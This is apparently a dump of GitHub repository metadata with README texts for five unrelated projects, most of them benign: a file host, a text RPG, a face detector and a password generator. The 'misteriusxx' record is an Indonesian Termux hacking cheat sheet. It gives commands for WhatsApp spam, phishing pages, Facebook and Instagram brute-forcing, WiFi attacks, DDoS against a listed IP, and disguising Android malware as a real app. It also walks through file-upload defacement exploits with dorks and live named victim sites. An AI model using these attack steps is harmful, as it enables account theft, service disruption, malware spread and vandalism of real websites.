418005510;privfiles;https://github.com/WardPearce/privfiles;Python;2021-10-17T03:06:34Z;1;1;0;"Privfiles - Encrypted file storage using Fernet with zero Javascript Source code for the onion service: l3n6v6dm63frml22tlmzacnasvp7co7wylu4hhcs34ukxe7q56yb4tyd.onion Previews   Setup Git clone git clone https://github.com/WardPearce/privfiles Install Mongodb community edition Install python requirements pip3 install -r requirements.txt Nginx  Restricting Access to Admin Page with Nginx Uvicorn deployment  server { 	listen 127.0.0.1:8080; 	client_max_body_size 4G;  	chunked_transfer_encoding on;  	location ~ /admin { 		auth_basic ""privfiles admin""; 		auth_basic_user_file /etc/apache2/.htpasswd;  		proxy_redirect off; 		proxy_buffering off; 		proxy_pass http://uvicorn; 	}  	location / { 		proxy_redirect off; 		proxy_buffering off; 		proxy_pass http://uvicorn; 	} }  upstream uvicorn { 	server unix:/tmp/uvicorn.sock; }  Adding fonts for recaptcha Add .ttf fonts to privfiles/fonts for recaptcha generation Configure run.py import uvicorn  from privfiles import PrivFiles from privfiles.settings import B2Settings   app = PrivFiles(     backblaze_settings=B2Settings(         key_id=""..."",         application_key=""..."",         bucket_id=""...""     ) )   if __name__ == ""__main__"":     uvicorn.run(         app,         uds=""/tmp/uvicorn.sock"",         log_level=""error""     )  Running Use something like pm2 to run run.py & api_task.py in the background. Thanks to  cryptography by The Python Cryptographic Authority and individual contributors motor by A. Jesse Jiryu Davis pymongo by Bernie Hackett starlette by Tom Christie anyio by Alex Grönholm idna by Kim Davies sniffio by Nathaniel J. Smith Jinja by Armin Ronacher backblaze by WardPearce httpx by Tom Christie certifi by Kenneth Reitz charset-normalizer by Ahmed TAHRI @Ousret sniffio by Nathaniel J. Smith httpcore by Tom Christie h by Seth Michael Larson anyio by Alex Grönholm idna by Kim Davies aiofile by Dmitry Orlov me@mosquito.su caio by Dmitry Orlov me@mosquito.su aiofiles by Tin Tvrtkovic asynctest by Martin Richard sphinxcontrib-trio by Nathaniel J. Smith Sphinx by Georg Brandl sphinxcontrib-applehelp by Georg Brandl sphinxcontrib-devhelp by Georg Brandl sphinxcontrib-jsmath by Georg Brandl sphinxcontrib-htmlhelp by Georg Brandl sphinxcontrib-serializinghtml by Georg Brandl sphinxcontrib-qthelp by Georg Brandl Jinja by Armin Ronacher Pygments by Georg Brandl docutils by David Goodger snowballstemmer by Snowball Developers Babel by Armin Ronacher pytz by Stuart Bishop alabaster by Jeff Forcier imagesize by Yoshiki Shibukawa requests by Kenneth Reitz setuptools by Python Packaging Authority packaging by Donald Stufft and individual contributors pyparsing by Paul McGuire sphinx-material by Kevin Sheppard BeautifulSoup by Leonard Richardson css-html-js-minify by Juan Carlos lxml by lxml dev team captcha by Hsiaoming Yang Pillow by Alex Clark (PIL Fork Author) uvicorn by Tom Christie asgiref by Django Software Foundation click by Armin Ronacher h by Seth Michael Larson itsdangerous by Armin Ronacher python-dotenv by Saurabh Kumar bcrypt by The Python Cryptographic Authority developers python-multipart by Andrew Dunham  "
417991269;TerminalRPG;https://github.com/cordeirossauro/TerminalRPG;Python;2021-10-17T01:37:38Z;0;0;0;"TerminalRPG Simple Python text-based RPG that can be played on the terminal. New adventures are very easily added to the ones already existent (through a simple .txt), and all characters are persistent and created directly from the terminal. Already Done  Starting menu is totally finished and usable; Function to read character sheets and adventures from the respective folder is totally finished;  To do  Create main game function Add monsters and combat Much more...  "
418005505;scrfd-opencv;https://github.com/hpc203/scrfd-opencv;Python;2021-10-17T03:06:33Z;1;1;0;scrfd-opencv 使用OpenCV部署SCRFD人脸检测，包含C++和Python两种版本的程序实现，本套程序只依赖opencv库就可以运行， 从而彻底摆脱对任何深度学习框架的依赖。 SCRFD是一个FCOS式的人脸检测器，2021年5月刚发出来的，SCRFD 是高效率高精度人脸检测算法，速度和精度相比其他算法都有提升。 你的机器里只要安装里OpenCV库，就能运行本套程序。C++版本的主程序是main.cpp，Python版本的主程序是main.py。 程序输出检测到的人脸矩形框和5个关键点 
418003595;misteriusxx;https://github.com/sllumenikmati21/misteriusxx;;2021-10-17T02:55:06Z;0;0;0;"misteriusxx KUMPULAN CODE TERMUX LENGKAP   | SPAM CHAT WHATSAPP || nggk usah nyepam gw -*   atau hp lu gw ledakin!!#@vms $ pkg update && pkg upgrade Setelah mengupdate dan mengupgrade termux ketikan perintah berikut : $ pkg install python2 (y/n pilih y) $ pkg install php (y/n pilih y) $ pkg install git (y/n pilih y) Setalah mengikuti perintah di atas waktu-nya kita clonning tool-nya : $ git clone https://github.com/siputra12/prank.git Setelah proses cloning selesai kita move on dari perintah di atas dan ketikan perintah ini : $ cd prank $ ls $ php wa.php Kemudian masukan Nomor WhatsApp yang kalian ingin spam contoh : 085710917169 kemudian enter pada pilihan y/n pilih y .. .welcome back to me catatan:)....  #@vms          "" jngan lupa subcribe pak VEMAS DARK --...  (:"" ""phising game"" (mobile legends dan clash of clan) $apt update $apt upgrade -y $pkg install python2 -y $pkg install apache2 $pkg install php -y $pkg install git $git clone https://github.com/Senitopeng/PhisingGame $ls $cd PhisingGame $python2 phising.py Gunain dengan bijak cuk -_- Cara Install OSIF ( Open Source Information Facebook ) $ pkg install python2 $ git clone https://github.com/ciku370/OSIF $ cd OSIF $ pip2 install -r requirements.txt Dan cara menjalankannya menggunakan perintah : python2 osif.py    by: Vdk CARA SADAP WA SeNaNg-SeNaNg H4CK1NG MR.STAH $pkg update && pkg upgrade $pkg install git $pkg install curl $git clone https://github.com/AndriGanz/whatshack $cd whatshack $ls $sh whatshack.sh Jangan salah gunakan Tutorial termux Silahkan perdalami... D-tect tool Cara Install D-tect tool di android termux (command ) : $ apt install git $ apt install python2 $ git clone https://github.com/shawarkhanethicalhacker/D-TECT $ ls $ cd D-TECH $ chmod +x d-tect.py $ python2 d-tect.py 2. cara uninstall tool termux rm -rf toolsnya 3. cara buat virus cd /sdcard cd vbug ls chmod vbug.py chmod -v vbug.py python2 vbug.py 4. irssi   /connet irc.freenode.net /nick w3wandroid /join #modol _________________________ DDOS via Termux ———————————— 1. Hammer $ pkg update (tekan enter) $ pkg upgrade (tekan enter) $ pkg install python (tekan enter) $ pkg install git (tekan enter) $ git clone https://github.com/cyweb/hammer (tekan enter) $ cd hammer (tekan enter) $ python hammer.py (tekan enter) $ python hammer.py -s [IP target] -p [port] -t 135 (tekan enter)   104.27.146.125 2. Xerxes $ apt install git $ apt install clang $ git clone https://github.com/zanyarjamal/xerxes $ ls $ cd xerxes $ ls $ clang xerxes.c -o xerxes $ ls $ ./xerxes (nama website) 80 3. Torshammer $ pkg update $ pkg install git $ apt install tor $ pkg install python2 $ git clone https://github.com/dotfighter/torshammer.git $ ls $ cd torshammer $ python2 torshammer.py 4. liteDDOS $ apt update $ apt upgrade $ pkg install git $ pkg install python2 $ git clone https://github.com/4L13199/LITEDDOS $ cd LITEDDOS $ python2 liteDDOS.py _________________________________________ Bermain moon-buggy $ pkg install moon-buggy $ moon-buggy ________________________________________ Musikan di termux $ pkg install mpv $ mpv/sdcard/lagu.mp3 /sdcard/ bisa di ganti sesuai letak musik ________________________________________ Browsing di termux $ pkg install w3m $ w3m www.google.com Linknya bsa diubah ________________________________________ Telephone di termux $ pkg install termux-api $ termux-telephony-call nomornya _______________________________________ Menampilkan animasi kereta  $ pkg install sl $ sl _______________________________________ menampilkan ikon dan informasi sistem android $ pkg install neofetch $ neofetch _______________________________________ menampilkan teks dalam format ASCII $ pkg install figlet $ figlet masukin teksnya _______________________________________ Cara Mendengarkan Yotuube di termux $ pip install mps_youtube $ pip install youtube_dl $ apt install mpv $ mpsyt $ /judul lagu Tinggal pilih lagu dgn mengetik nomornya.                    Tutorial membuat virus seperti aplikasi aslinya Tools yang dibutuhkan: APK Editor & tool vbug APK Editor bisa didownload di playstore Tool vbug Here 1. Download tool vbugnya dulu 2. Taruh file tool vbug di luar folder pada memori internal 3. Buka termux lalu $ cd /sdcard 4. $ unzip vbug.zip 5. $ cd vbug 6. $ python2 vbug.py 7. Enter 8. Ketik 10 9. Ketik E 10. Aplikasi virusnya sudah jadi Setelah aplikasinya jad kita tinggal edit supaya mirip aslinya 1. Buka APK Editor 2. Klik Select an Apk File 3. Pilih aplikasi virus tadi 4. Klik full edit 5. Pada bagian kolom app_name tulis nama aplikasi yang kalian inginkan 6. Lalu klik files 7. Klik res/drawable 8. Logo yang kedua itu ganti dengan logo aplikasi yang kalian inginkan Catatan: format logo harus .png 9. Ceklist logo yang kedua lalu replace 10. Pilih file logo yang mau dijadikan logo aplikasi agan 11. Back sampai home Supaya aplikasi terlihat lebih nyata kita harus beri bobot pada aplikasi buatan kita 12. Klik tanda plus yang ada di bawah kiri, pilih file, lagu, gambar atau apapun yang coxok sebagai bobot apliaksi agan 13. Klik build 14. Tunggu hingga selesai 15. Jadi deh ———————— Auto boot fb git clone https://github.com/Senitopeng/BotFbBangDjon.git cd BotFbBangDjon python2 bangdjon.py melihat id fb https://findmyfbid.in/ Autoreaction Facebook git clone https://github.com/tomiashari/fb-autoreaction.git cd fb-autoreaction python2 fb-autoreaction •TOOLS²TERMUX.P3 21.TOOLS SQLMAP apt update apt install python apt install python2 apt install git git clone https://github.com/sqlmapproject/sqlmap cd sqlmap python2 sqlmap.py ============================= 22.TUTORIAL PHISING INSTAGRAM VIA TERMUX pkg update pkg upgrade pkg install python2 pkg install git clear git clone https://github.com/evait-secutiry/weeman.git cd ls cd weeman python2 weeman.py show set url http://dewopanel.host22.com/masuk.php set port 8080 set action_url http://dewopanel.host22.com/masuk.php run ============================= 23.TUTORIAL MENAMBAH FOLLOWERS&LIKE INSTAGRAM Kegunaan untuk menambah follower dan like ig pkg update pkg upgrade pkg install python2 pkg install ruby gem install lolcat pkg install git git clone https://github.com/Hanzelnutt/instabot cd instabot ls pip2 install -r requirements.txt bash instabot ============================= 24.TUTOR HACK WIFI KHUSUS ROOT apt update apt upgrade apt install git git clone https://github.com/esc0rtd3w/wifi-hacker ls cd wifi-hacker ls chmod +x wifi-hacker.sh ls ./wifi-hacker.sh ============================= 25.TOOLS xNOT_FOUND VER1 apt update && apt upgrade pkg install git pkg install gem pkg install figlet gem install lolcat git clone https://github.com/hatakecnk/xNot_Found cd xNot_Found sh xNot_Found.sh ============================= 26.HACK FB Nih ada tutor buat lewat TERMUX buat hack FB apt update && apt upgrade apt install python apt install python2 apt install ruby apt install git apt install wget apt install curl pip2 install mechanize pip2 install requests git clone https://github.com/hnov7/mbf tunggu hingga selesai,jika sudah selesai silahkan buka tab baru atau new session lalu ketik : cd mbf python2 mbf.py ============================= 27.HACK GMAIL apt-get update && apt-get upgrade  apt-get install git  apt-get install python python-pip python-setuptools  pip install scapy  git clone https://github.com/wifiphisher/wifiphisher.git cd wifiphisher< python setup.py install  cd wifiphisher  python wifiphisher ============================= 28.BERMAIN MOON-BUGGY pkg install moon-buggy moon-buggy ============================= 29.PERKIRAAN CUACA curl http://wttr.in/ (lokasi)  ============================= 30.BROWSING DI TERMUX pkg install w3m w3m www.google.com Linknya bsa diubah ============================= [8/10 19.49] Yovis Si Wibub: Apt update Apt upgrade Apt install mechanize Apt install git git clone http://github.com/hnov7/mbf cd mbf python2 mbf. py Mbf tanpa username dan password. Jdi tinggl make aja [8/10 19.49] Yovis Si Wibub: --------------------------TOTUR MBF-----------------------$ pkg update && pkg upgrade $ pkg install python2 $ pip2 install mechanize ‌$ git clone https://github.com/pirmansx/mbf Cara Menjalankannya : $ ls $ cd mbf $ python2 MBF.py  [9/10 17.25] ‌~I⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟: Memper Cantik/Melihat V.Android Termux $ pkg update && pkg upgrade $ pkg install ruby cowsay toilet figlet $ pkg install neofetch $ pkg install nano $ gem install lolcat $ cd ../usr/etc $ nano bash.bashrc cowsay -f eyes Cyber | lolcat toilet -f standard Indonesia -F gay neofetch date | lolcat ✓ Hack FB rombongan $ apt update && apt upgrade $ pkg install python2 git $ pip2 install mechanize $ git clone http://github.com/pirmansx/mbf $ ls $ cd mbf $ python2 MBF.py ✓ Hack FB ngincer $ Apt update ( Enter ) $ Apt upgrade ( Enter ) $ Apt install python2 ( Enter ) $ pip2 install urllib3 chardet certifi idna requests ( Enter ) $ apt install openssl curl ( Enter ) $ pkg install libcurl ( Enter ) $ ln /sdcard ( Enter )  $ cd /sdcard ( Enter ) $ python2 fbbrute.py ( Enter ) ✓ Hack Gmail apt-get update && apt-get upgrade $ apt-get install git $ apt-get install python python-pip python-setuptools $ pip install scapy $ git clone https://github.com/wifiphisher/wifiphisher.git $ cd wifiphisher< $ python setup.py install $ cd wifiphisher $ python wifiphisher  Nih yang mau hack WiFi Khusus root $apt update $apt upgrade $apt install git $git clone https://github.com/esc0rtd3w/wifi-hacker $ls $cd ‌Ni KUMPULAN TUTOR TERMUX [X SCREW UP X] HACK INSTAGRAM ( sosial engineering) $ apt update && apt upgrade $ pkg install python $ pkg install git  $ pkg install nano $ git clone https://github.com/avramit/instahack.git $ ls $ cd instahack $ ls $ pip install requests $ cd instahack $ nano pass.txt $ cat pass.txt $ ls $ python hackinsta.py Localizar ip Apt install python git git clone https://github.com/maldevel/IPGeoLocation.git cd IPGeoLocation chmod +x ipgeoLocation.py pip install -r requirements.txt python ipgeolocation.py -m python ipgeolocation.py -t http://www.google.com Lacak IP git clone https://github.com/maldevel/IPGeolocation cd IPGeolocation chmod +x ipgeolocation.py pip install -r requirements.txt python ipgeolocation.py -m python ipgeolocation.py -t IP yang ingin dilacak TOOL DDOS VIA TERMUX 1. Hammer $ pkg update (tekan enter) $ pkg upgrade (tekan enter) $ pkg install python (tekan enter) $ pkg install git (tekan enter) $ git clone https://github.com/cyweb/hammer (tekan enter) $ cd hammer (tekan enter) $ python hammer.py (tekan enter) $ python hammer.py -s [IP target] -p [port] -t 135 (tekan enter)   2. Xerxes $ apt install git $ apt install clang $ git clone https://github.com/zanyarjamal/xerxes $ ls $ cd xerxes $ ls $ clang xerxes.c -o xerxes $ ls $ ./xerxes (nama website) 80 3. Torshammer $ pkg update $ pkg install git $ apt install tor $ pkg install python2 $ git clone https://github.com/dotfighter/torshammer.git $ ls  $ cd torshammer $ python2 torshammer.py 4. liteDDOS $ apt update $ apt upgrade $ pkg install git $ pkg install python2 $ git clone https://github.com/4L13199/LITEDDOS $ cd LITEDDOS $ python2 liteDDOS.py RED_HAWK tool $ apt update $ apt install git $ git clone https://github.com/Tuhinshubhra/RED_HAWK $ cd RED_HAWK $ chmod +x rhawk.php $ apt install php $ ls $ php rhawk.php ‌Install webdav  $ apt update && upgrade  $ apt install python2  $ pip2 install urllib3 chardet certifi idna requests  $ apt install openssl curl  $ pkg install libcurl  $ ln -s /sdcard  $ cd sdcard  $ mkdir webdav  $ cd webdav ‌Tutorial Install Tools-B4J1N64Nv5 pkg install update pkg install git pkg install toilet pkg install figlet pip2 install lolcat git clone https://github.com/DarknessCyberTeam/B4J1N64Nv5 cd B4J1N64Nv5 sh B4J1N64N.sh ‌cara install termux ubuntu - apt update/pkg update - apt upgrade/pkg upgrade - pkg install git - pkg install proot - pkg install wget - git clone https://github.com/Neo-Oli/termux-ubuntu - cd termux-ubuntu - chmod +x ubuntu.sh - pip install -r requirements.txt - ./ubuntu.sh Untuk menjalankan - ./start.sh Cara install github tembak XL Dari awal  1.pkg upgrade 2.pkg update 3.pkg install git 4.pkg install python 5.git clone https://github.com/albertoanggi/xl-py 6.pip install -r requirements.txt 7.chmod +x app.py 8.python/python2 app.py Install admin finder in termux $ apt update && apt upgrade $ pkg install python2 $ pkg install git $ git clone https://github.com/AdheBolo/AdminFinder Menjalankan $ ls $ cd AdminFinder $ chmod 777 AdminFinder.py $ python2 AdminFinder.py Cara install tool Mr.Rv1.1 $apt update && apt upgrade $pkg install git $pkg install gem $pkg install figlet $gem install lolcat $git clone https://github.com/Mr-R225/Mr.Rv1.1 $cd Mr.Rv1.1 $sh Mr.Rv1.1.sh tool install $ apt update && apt upgrade $ apt install git $ git clone https://github.com/aryanrtm/4wsectools cd 4wsectools chmod 777 tools ./tools TOOL FSOCIETY $ git clone https://github.com/manisso/fsociety $ cd fsociety $ ./install.sh $ ls $ python2 fsociety.py SQLMAP  apt update apt install python apt install python2 apt install git git clone https://github.com/sqlmapproject/sqlmap https://github.com/sqlmapproject/sqlmap.git cd sqlmap Python2 sqlmap.py Exemplo Python2 sqlmap.py -u website –dbs -D acuart –tables -D acuart -T users –columns -D acuart -T users -C name,email,phone -dump BUSCA PAINEL ADM DE SITE pkg install git git clone https://github.com/Techzindia/admin_penal cd admin_penal chmod +x admin_panel_finder.py python2 admin_panel_finder.py HAKKU apt install pytho apt install git mkdir vasu git clone https://github.com/4shadoww/hakkuframework cd hakkuframework chmod +x hakku python hakku show modules use whois show options set target examplesite.com run TOOL D-TECT apt update apt install git git clone https://github.com/shawarkhanethicalhacker/D-TECT cd D-TECT apt install python2 chmod +x d-tect.py python2 d-tect.py examplesite.com viSQL apt update apt install python2 apt install git git clone https://github.com/blackvkng/viSQL cd viSQL python2 -m pip install -r requirements.txt python2 viSQL.py python2 viSQL.py -t http://www.bible-history.com Hash Buster apt update apt upgrade apt install python2 apt install git git clone https://github.com/UltimateHackers/Hash-Buster cd Hash-Buster python2 hash.py tool ubuntu $ apt update $ apt install git $ apt install wget $ apt install proot $ git clone https://github.com/Neo-Oli/termux-ubu&amp;#8230; $ cd termux-ubuntu $ chmod +x ubuntu.sh $ ./ubuntu.sh $ ./start.sh (````Install``` Hunner framework) $ apt update  $ apt install python $ apt install git -y $ git clone https://github.com/b3-v3r/Hunner $ cd Hunner $ chmod 777 hunner.py $ python hunner.py Cara Install Lazymux di Termux $ pkg update && upgrade  $ pkg install python2  $ pkg install git  $ git clone https://github.com/Gameye98/Lazymux  $ cd Lazymux  $ chmod +x lazymux.py  $ python2 lazymux.py Cara install tools daijobu Fungsinya nanti liat sendiri lah di dalem tools nya  $apt upgrade && apt update  $apt install php  $apt install git  Kalo udah selesai langsung masukan git nya dengan perintah  $git clone https://github.com/alintamvanz/diejoubu  $cd diejoubu  $cd v1.2  $php diejoubu.php Hecker RECONDOG apt update apt install python python2 apt install git git clone https://github.com/UltimateHackers/ReconDog cd ReconDog chmod +x dog.py Python2 dog.py DEFACE Hacking Script-Deface $apt update $apt upgrade $apt install git $apt install python2 $git clone https://github.com/Ubaii/script-deface-creator $ls $cd script-deface-creator $ls $chmod +x create.py $ls $python2 create.py done semoga bisa bikin script Html CARA DEFACE  Cara1 Siapkan script sendiri.. 1.buka browser kalian apa saja terserah lalu ke google 2.tulis dork nya berikut ini (inurl:""sitefinity/login.aspx) tanpa tanda buka kurung dan tutup kurung! lalu search 3.pilih lah salah satu website terserah kalian,klik website nya lalu tambahkan exploit nya sebagai berikut (sitefinity/usercontrols/dialog/documenteditordialog.aspx) tanpa buka tutup kurung! E http://sitetarget*org/sitefinity/usercontrols/dialogs/documenteditordialog.aspx 4.lalu klik search kembali! nah disitu kalian klik chose file dan pilih script deface punya kalian 5.klik yang di bawah nya tunggu sampai loading selesai 6.tambah link target tadi dengan (/files) contoh http://sitetarget*org/files/namascriptdefacekalian.html lalu klik search 7.selesai!! Cara2 Method/metode KCFinder Inurl:/kcfinder/browse.php Inurl:/Kcfinder/ Langsung saja upload file deface anda,lalu panggil dengan tambahan /file/namasckamu.html Contoh: https://basukiwater.com/kcfinder/browse.php jadi https://basukiwater.com/file/namasckamu.html cara3 Deface Onion.to File Upload  Tutor ini sekarang lagi Ngtreend & Simple , tapi ingat ya bukan Deepweb melaikan Fake Deepweb hehehe... Mari kita Lanjut... Dork : - inurl:/upload site:.onion.to            - intext:""Upload"" site:.onion.to Live : https://tt3j2x4k5ycaa5zt.onion.to/upload.php Step By Step : 1. Dorking Dulu 2. Pilih Web Target 3. Pilih File yang mau di'upload 4. Tinggal klik Upload => Done 😆 Contoh Target : https://tt3j2x4k5ycaa5zt.onion.to/uploads/lopeyou.html https://danwin1210.me/uploads/lopeyou.html https://temp.xn--wda.fr/e719x8JgJ.html Mirror?! 😆 https://www.defacer.id/296011.html https://www.defacer.id/296024.html cara4 Metode com media Bahan : 1. Dork : - inurl:com_media site:com             - inurl:com_media intext:""Upload"" 2. Exploit : /index.php?option=com_media&view=images&tmpl=component&fieldid=&e_name=jform_articletext&asset=com_content&author=&folder= 3. Upload'an : Format .txt 😁 Live Target : http://www.james-insurance.co.uk/ Step by Step : gunakan Live Targert dulu untuk Uji Coba 😁 1. Masukkan dork : inurl:com_media intext:""Upload"" site:co.uk 2. Pilih salah satu Web 3. Masukkan Exploit http://www.james-insurance.co.uk/index.php?option=com_media&amp;view=images&amp;tmpl=component&amp;fieldid=&amp;e_name=jform_articletext&amp;asset=com_content&amp;author=&amp;folder= 4. Lalu Upload file dalam tempat upload ( format .txt ) Akses shell ? Tambahkan : /images/namafile.txt                        contoh : http://www.james-insurance.co.uk/images/fac.txt Nanti Jadi Gini Hasilnyaa.. Mudah Bukan?! Tinggal Upload ke Defacer.id 😁 cara5 [POC] Vulnerability Simplicity Of Upload #Step 1: Dork: “Powered By: © Simplicity oF Upload” #Step 2: Exploit: http://[situstargetkamu]/PATH/upload.php *Tergantung dengan target. #Step 3: llowed file: gif, jpg, png, txt, php, asp, cgi, zip, exe, mp3, etc (not allowed for html) #Step 4: Preview: http://[situstargetkamu]/upload/[Your File] #Step 5: Live Demo: http://www.railfaneurope.net/pix/upload.php http://www.formplas.com/upload/upload.php Nah, saya kira cukup segitu aja kok, karena mudah tuh tutorial nya. Al in one crip termux $ apt update && apt upgrade $ pkg install php figlet ruby python python2 $ pip2 install lolcat $ git clone https://github.com/Rusmana-ID/rus $ cd $ cd rus $ ls $ sh v2.sh Kontak wa 083879017166 Note: user name:Rusmana Pasword:X-One "
418011701;Password-generator;https://github.com/Haneen-Heeba/Password-generator;;2021-10-17T03:47:49Z;0;0;0;Password-generator Security is one of the most crucial parts of our lives. The importance of security is increasing day by day as most things are going online. Passwords come into light as we talk about security. Password Generator 🔢 : The best thing about creating our own password generator is that we can customize it as we like. First, we will create a password generator that asks the length of the password and generates a random password containing digits, alphabets, and special characters. Next, we will improve it by asking the number of each type of character, like the number of digits, alphabets, and special characters. Steps for creating a password generator :  Store all the characters as a list. We can use the string module of Python or type all of them. Ask the user to enter the length of the password. Shuffle the characters using the random.shuffle method. 4.Initialize an empty list to store the password. Write a loop that iterates length times. Pick a random character from all the characters using the random.choice method. Append the random character to the password. Shuffle the resultant password list to make it more random. Convert the password list to string using the join method. Print the password.  
